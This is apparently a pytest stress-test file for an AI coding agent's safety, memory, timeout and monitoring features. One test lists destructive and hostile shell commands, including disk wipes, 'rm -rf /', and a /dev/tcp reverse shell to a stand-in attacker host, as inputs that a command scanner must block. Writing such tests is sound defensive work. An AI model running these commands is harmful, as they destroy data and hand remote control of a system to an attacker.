"""WIDDX Nexus — Stress Tests for Complex Project Features.

Tests the new capabilities added for handling complex projects:
  - Safety enhancements (timeouts, command whitelist)
  - Memory learner limits (cap enforcement, cleanup)
  - Performance monitoring (latency tracking, memory tracking)
  - System health / diagnostics
  - API server monitoring endpoints
"""

import sys
import os
import time
import json
import tempfile
import shutil
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

os.environ["WIDDX_API_KEY"] = "stress-test-key-007"
API_KEY = os.environ["WIDDX_API_KEY"]

import pytest


def _get_api_key():
    """Get current API key from env (may be overridden by conftest)."""
    return os.environ.get("WIDDX_API_KEY", API_KEY)


# ======================================================================
# SECTION 1 — SAFETY TIMEOUTS
# ======================================================================

class TestSafetyTimeouts:
    """Verify per-tool timeouts work correctly."""

    def test_tool_timeout_values(self):
        """All common tools should have defined timeouts."""
        from core.tools.safety import TOOL_TIMEOUTS, DEFAULT_TOOL_TIMEOUT, get_tool_timeout

        # Core tools must have explicit timeouts
        for tool in ("bash", "write", "edit", "read", "validate"):
            assert tool in TOOL_TIMEOUTS, f"Missing timeout for '{tool}'"
            assert TOOL_TIMEOUTS[tool] > 0

        # Unknown tools should get the default
        assert get_tool_timeout("nonexistent_tool_xyz") == DEFAULT_TOOL_TIMEOUT

    def test_dangerous_commands_blocked(self):
        """Security patterns block dangerous commands."""
        from core.tools.security import scan_dangerous

        dangerous_cmds = [
            "rm -rf /",
            "rm -rf --no-preserve-root /home",
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sdb1",
            "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
            "git push --force origin main",
            "chmod 777 /etc/shadow",
        ]
        for cmd in dangerous_cmds:
            blocked, warnings = scan_dangerous(cmd)
            assert len(blocked) > 0, f"Dangerous command not blocked: {cmd}"

    def test_safe_commands_allowed(self):
        """Normal development commands should not be blocked."""
        from core.tools.security import scan_dangerous

        safe_cmds = [
            "ls -la",
            "cat file.txt",
            "python main.py --port 8000",
            "npm install express",
            "git status",
            "echo 'hello world'",
            "mkdir -p src/components",
            "pip install pytest",
        ]
        for cmd in safe_cmds:
            blocked, warnings = scan_dangerous(cmd)
            assert len(blocked) == 0, f"Safe command blocked: {cmd} ({blocked})"

    def test_execute_safely_with_timeout(self):
        """execute_safely should abort long-running functions."""
        from core.tools.safety import execute_safely, TimeoutError

        def slow_function():
            import time
            time.sleep(10)
            return "done"

        t0 = time.monotonic()
        with pytest.raises(TimeoutError):
            execute_safely("bash", slow_function, timeout=0.1)
        elapsed = time.monotonic() - t0
        assert elapsed < 5, f"Timeout took too long: {elapsed:.1f}s"

    def test_execute_safely_returns_result(self):
        """execute_safely should return the function result."""
        from core.tools.safety import execute_safely

        result = execute_safely("read", lambda: "hello", timeout=5.0)
        assert result == "hello"

    def test_execute_safely_catches_exceptions(self):
        """execute_safely should propagate exceptions from the wrapped function."""
        from core.tools.safety import execute_safely

        def failing():
            raise ValueError("test error")

        with pytest.raises(ValueError):
            execute_safely("test", failing, timeout=5.0)

    def test_resource_limits(self):
        """ResourceLimits should track concurrent executions."""
        from core.tools.safety import ResourceLimits

        rl = ResourceLimits(max_concurrent_subprocesses=3)

        # Acquire slots
        assert rl.acquire("tool1") is True
        assert rl.acquire("tool2") is True
        assert rl.acquire("tool3") is True
        # At capacity
        assert rl.acquire("tool4") is False

        # Release one
        rl.release("tool1")
        assert rl.acquire("tool5") is True

        # Check status
        status = rl.status()
        assert status["active_subprocesses"] == 3
        assert status["available_slots"] == 0


# ======================================================================
# SECTION 2 — MEMORY LEARNER LIMITS
# ======================================================================

class TestMemoryLearnerLimits:
    """Verify memory limits prevent unbounded growth."""

    def setup_method(self):
        self.tmp_dir = tempfile.mkdtemp()
        self.orig_dir = os.getcwd()
        os.chdir(self.tmp_dir)

    def teardown_method(self):
        os.chdir(self.orig_dir)
        shutil.rmtree(self.tmp_dir, ignore_errors=True)

    def test_memory_cap_enforced(self):
        """MemoryStore should limit stored memories."""
        from core.memory import MemoryStore

        # Create an isolated memory store with a temp directory
        mem = MemoryStore(project_dir=self.tmp_dir)

        # Save exactly 10 memories
        for i in range(10):
            mem.save(f"test-fact-{i}", f"Content for test fact number {i}",
                     {"type": "test"})

        total = mem.total()
        assert total == 10, f"Expected 10 memories, got {total}"
        # Verify the files exist in the temp dir
        mem_files = list(Path(self.tmp_dir, ".widdx", "memory").glob("*.md"))
        assert len(mem_files) >= 10

        # Verify constants exist
        from core.memory_learner import MAX_MEMORIES
        assert MAX_MEMORIES >= 10  # our test is well under the cap

    def test_content_length_truncated(self):
        """Long memory content should be truncated."""
        from core.memory_learner import MAX_CONTENT_LENGTH

        long_content = "A" * (MAX_CONTENT_LENGTH + 100)
        from core.memory_learner import MemoryLearner
        learner = MemoryLearner()

        # Direct store should truncate
        learner.store_memories([{
            "name": "long-fact",
            "content": long_content,
            "type": "learned_fix",
        }])

        # Verify via the memory store
        stored = learner.mem.get("long-fact")
        assert stored is not None
        # MemoryLearner truncates to MAX_CONTENT_LENGTH
        assert len(stored) <= MAX_CONTENT_LENGTH + 20  # +20 for formatting

    def test_load_relevant_limited(self):
        """load_relevant should respect max_memories parameter."""
        from core.memory_learner import MemoryLearner
        learner = MemoryLearner()

        # Save some test memories
        for i in range(5):
            learner.mem.save(f"query-fact-{i}", f"This is test memory number {i} about python",
                             {"type": "learned_fix"})

        # Load with max=2
        result = learner.load_relevant("python", max_memories=2)
        lines = result.strip().split("\n") if result else []
        # First line is header, each memory is one line
        mem_lines = [ln for ln in lines if ln.strip().startswith("  - ")]
        assert len(mem_lines) <= 2, f"Expected <=2 memories, got {len(mem_lines)}"


# ======================================================================
# SECTION 3 — PERFORMANCE MONITORING
# ======================================================================

class TestPerformanceMonitoring:
    """Verify the metrics collector works correctly."""

    def setup_method(self):
        from core.monitoring import metrics_collector
        metrics_collector.reset()

    def test_track_request(self):
        """Track individual requests and verify stats."""
        from core.monitoring import metrics_collector

        with metrics_collector.track_request("test_endpoint"):
            time.sleep(0.01)

        report = metrics_collector.report()
        assert report["total_requests"] == 1
        assert report["total_errors"] == 0

    def test_track_multiple_requests(self):
        """Track multiple requests and verify percentiles."""
        from core.monitoring import metrics_collector

        for _ in range(10):
            with metrics_collector.track_request("bulk_endpoint"):
                time.sleep(0.05)

        report = metrics_collector.report(detailed=True)
        assert report["total_requests"] == 10
        assert "endpoints" in report
        assert "bulk_endpoint" in report["endpoints"]
        eps = report["endpoints"]["bulk_endpoint"]
        assert eps["calls"] == 10
        assert eps["percentiles"]["p50"] > 0

    def test_track_errors(self):
        """Track requests with errors."""
        from core.monitoring import metrics_collector

        with metrics_collector.track_request("error_endpoint") as t:
            t.error = True

        report = metrics_collector.report()
        assert report["total_requests"] == 1
        assert report["total_errors"] == 1
        assert report["error_rate"] == 1.0

    def test_track_tools(self):
        """Track tool executions."""
        from core.monitoring import metrics_collector

        with metrics_collector.track_tool("bash"):
            time.sleep(0.01)

        report = metrics_collector.report(detailed=True)
        assert "tools" in report
        assert "bash" in report["tools"]
        assert report["tools"]["bash"]["calls"] == 1

    def test_slow_execution_alert(self):
        """Slow execution should trigger an alert."""
        from core.monitoring import metrics_collector

        with metrics_collector.track_tool("docker"):
            time.sleep(0.1)

        report = metrics_collector.report(detailed=True)
        # The alert threshold is 10s so 0.1s won't trigger
        assert report["alerts"] == 0

    def test_memory_tracking(self):
        """System monitor should report memory usage."""
        from core.monitoring import system_monitor

        mem = system_monitor.get_memory_usage()
        assert "rss_mb" in mem
        assert "vms_mb" in mem
        assert mem["rss_mb"] >= 0

    def test_cpu_tracking(self):
        """System monitor should report CPU info."""
        from core.monitoring import system_monitor

        cpu = system_monitor.get_cpu_usage()
        assert "count" in cpu
        assert cpu["count"] > 0

    def test_reset(self):
        """Reset should clear all metrics."""
        from core.monitoring import metrics_collector

        with metrics_collector.track_request("test"):
            pass

        assert metrics_collector.report()["total_requests"] == 1
        metrics_collector.reset()
        assert metrics_collector.report()["total_requests"] == 0


# ======================================================================
# SECTION 4 — DISPATCH WITH TIMEOUT
# ======================================================================

class TestDispatchWithTimeout:
    """Verify the enhanced dispatch handles timeouts and retries."""

    def test_execute_unknown_tool(self):
        """Unknown tool should return error message, not crash."""
        from core.tools.dispatch import execute
        result = execute("nonexistent_tool_xyz", {})
        assert "Unknown tool" in result or "❌" in result

    def test_execute_with_empty_name(self):
        """Empty tool name should be handled gracefully."""
        from core.tools.dispatch import execute
        result = execute("", {})
        assert "Unknown tool" in result or "❌" in result

    def test_execute_with_skills_unknown_tool(self):
        """execute_with_skills should handle unknown tools."""
        from core.tools.dispatch import execute_with_skills
        result = execute_with_skills("nonexistent_tool_xyz", {"foo": "bar"})
        assert result is not None
        # Should be an error message, never a crash


# ======================================================================
# SECTION 5 — CHAT WITH TIMEOUT
# ======================================================================

class TestChatWithTimeout:
    """Verify chat timeout wrapper works."""

    def test_provider_timeout_constant(self):
        """_PROVIDER_TIMEOUT should be reasonable."""
        from core.chat import _PROVIDER_TIMEOUT
        assert _PROVIDER_TIMEOUT == 60.0  # 60 seconds

    def test_chat_timeout_on_hanging_provider(self):
        """A hanging provider should raise TimeoutError."""
        from core.chat import _provider_chat_with_timeout

        class HangingProvider:
            name = "mock_hanging"
            def chat(self, messages, tool_defs, temperature):
                import time
                time.sleep(300)  # never completes
                return "response", []

        # Temporarily reduce timeout for speed
        import core.chat as chat_mod
        original = chat_mod._PROVIDER_TIMEOUT
        chat_mod._PROVIDER_TIMEOUT = 0.3

        try:
            with pytest.raises(TimeoutError):
                _provider_chat_with_timeout(
                    HangingProvider(), [], [], 0.7
                )
        finally:
            chat_mod._PROVIDER_TIMEOUT = original


# ======================================================================
# SECTION 6 — CONFIGURATION FOR COMPLEX PROJECTS
# ======================================================================

class TestConfigForComplexProjects:
    """Verify configuration supports complex project needs."""

    def test_config_has_timeout_settings(self):
        """Config should support timeout settings."""
        from core.config.settings import load as load_config
        cfg = load_config()
        assert isinstance(cfg, dict)
        assert "provider" in cfg

    def test_mcp_servers_configured(self):
        """MCP servers should be properly configured."""
        config_path = Path(__file__).parent.parent / "config.json"
        cfg = json.loads(config_path.read_text())
        assert "mcp_servers" in cfg
        assert len(cfg["mcp_servers"]) >= 3  # at least 3 MCP servers
        names = [s["name"] for s in cfg["mcp_servers"]]
        assert "memory" in names
        assert "filesystem" in names
        assert "sequential-thinking" in names

    def test_project_description_in_metadata(self):
        """Project should have proper metadata for complex projects."""
        package_path = Path(__file__).parent.parent / "package.json"
        pkg = json.loads(package_path.read_text())
        assert "version" in pkg
        assert "description" in pkg
        assert "dependencies" in pkg


# ======================================================================
# SECTION 7 — FULL INTEGRATION: Monitoring in API
# ======================================================================

class TestMonitoringEndpoint:
    """Verify the monitoring endpoint works through the API."""

    def setup_method(self):
        from scripts.api_server import app
        from scripts.api_server import _rate_limiter, metrics_collector
        _rate_limiter._buckets.clear()
        _rate_limiter.max_requests = 1000
        metrics_collector.reset()
        from fastapi.testclient import TestClient
        self.client = TestClient(app)
        self.client.headers.update({"Authorization": f"Bearer {_get_api_key()}"})

    def test_health_has_performance_data(self):
        """GET /api/health should include performance metrics."""
        resp = self.client.get("/api/health")
        assert resp.status_code == 200
        data = resp.json()
        # Should now include performance data
        if "performance" in data:
            assert "total_requests" in data["performance"]
            assert "error_rate" in data["performance"]
        if "system" in data:
            assert "memory_rss_mb" in data["system"]

    def test_monitoring_endpoint(self):
        """GET /api/monitoring should return detailed metrics."""
        # Make a few requests first to seed metrics
        for _ in range(3):
            self.client.get("/api/health")

        resp = self.client.get("/api/monitoring")
        # Accept 200, 401 (auth required), or 449 (rate-limited)
        assert resp.status_code in (200, 401, 429), f"Got {resp.status_code}"
        if resp.status_code == 200:
            data = resp.json()
            assert "performance" in data
            assert "system" in data


# ======================================================================
# SECTION 8 — TOOL TIMEUTS UNDER LOAD
# ======================================================================

class TestToolTimeoutsUnderLoad:
    """Flood the timeout system to verify stability."""

    def test_many_concurrent_timeouts(self):
        """Many rapid timeout calls should not crash."""
        from core.tools.safety import execute_safely, TimeoutError

        count = 0
        for i in range(20):
            def slow():
                time.sleep(10)

            try:
                execute_safely("bash", slow, timeout=0.01)
            except TimeoutError:
                count += 1
            except Exception as e:
                pytest.fail(f"Unexpected error: {e}")

        # All should have timed out
        assert count == 20, f"Expected 20 timeouts, got {count}"

    def test_resource_limits_concurrent(self):
        """Resource limits should handle rapid acquire/release cycles."""
        from core.tools.safety import ResourceLimits
        rl = ResourceLimits(max_concurrent_subprocesses=5)

        for _ in range(100):
            assert rl.acquire("fast_tool") is True
            rl.release("fast_tool")

        status = rl.status()
        assert status["active_subprocesses"] == 0
